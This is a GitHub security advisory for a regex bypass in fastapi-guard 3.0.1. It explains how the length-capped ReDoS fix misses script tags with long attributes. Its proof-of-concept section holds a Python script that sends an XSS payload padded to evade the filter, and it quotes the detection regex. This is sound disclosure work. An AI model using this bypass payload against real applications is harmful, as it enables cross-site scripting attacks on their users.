# [H] FastAPI Guard has a regex bypass

## Summary
Severity: High
Advisory: GHSA-rrf6-pxg8-684g
CVE: CVE-2025-54365
CWE: CWE-1333, CWE-185, CWE-20
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-07-23
Source: https://github.com/advisories/GHSA-rrf6-pxg8-684g
Type: github-advisory

## Affected
- PyPI: `fastapi-guard` — affected >=3.0.1 <3.0.2

## Details
### Summary

The regular expression patched to mitigate the ReDoS vulnerability by limiting the length of string fails to catch inputs that exceed this limit.

### Details

In version 3.0.1, you can find a commit like the one in the link below, which was made to prevent ReDoS.
https://github.com/rennf93/fastapi-guard/commit/d9d50e8130b7b434cdc1b001b8cfd03a06729f7f

This commit mitigates the vulnerability by limiting the length of the input string, as shown in the example below.
`r"<script[^>]*>[^<]*<\\/script\\s*>"` -> `<script[^>]{0,100}>[^<]{0,1000}<\\/script\\s{0,10}>`

This type of patch fails to catch cases where the string representing the attributes of a <script> tag exceeds 100 characters.
Therefore, most of the regex patterns present in version 3.0.1 can be bypassed.

### PoC

1. clone the fastapi-guard repository
2. Navigate to the examples directory and modify the main.py source code. Change the HTTP method for the root route from GET to POST.
<img width="1013" height="554" alt="image" src="https://github.com/user-attachments/assets/cf93ea37-2fd7-4251-abb6-b55f88685f54" />
3. After that, set up the example app environment by running the docker-compose up command. Then, run the Python code below to verify that the two requests return different results.

```python
import requests

URL = "<http://localhost:8000>"

obvious_payload = {
    "obvious" : "<script>alert(1);</script>"
}
response = requests.post(url=URL, json=obvious_payload)
print(f"[+] response of first request: {response.text}")

bypassed_payload = {
    "suspicious" : f'<script id="i_can_bypass_regex_filtering{'a'*100}">alert(1)</script>'
}

response = requests.post(url=URL, json=bypassed_payload)
print(f"[+] response of second request: {response.text}")

```
<img width="836" height="112" alt="image" src="https://github.com/user-attachments/assets/11dcccb2-6179-44b1-9628-ae0a787e3bb7" />

### Impact

Due to this vulnerability, most of the regex patterns can potentially be bypassed, making the application vulnerable to attacks such as XSS and SQL Injection.

## References
- https://github.com/rennf93/fastapi-guard/security/advisories/GHSA-rrf6-pxg8-684g
- https://nvd.nist.gov/vuln/detail/CVE-2025-54365
- https://github.com/rennf93/fastapi-guard/commit/0829292c322d33dc14ab00c5451c5c138148035a
- https://github.com/rennf93/fastapi-guard/commit/d9d50e8130b7b434cdc1b001b8cfd03a06729f7f
- https://github.com/rennf93/fastapi-guard
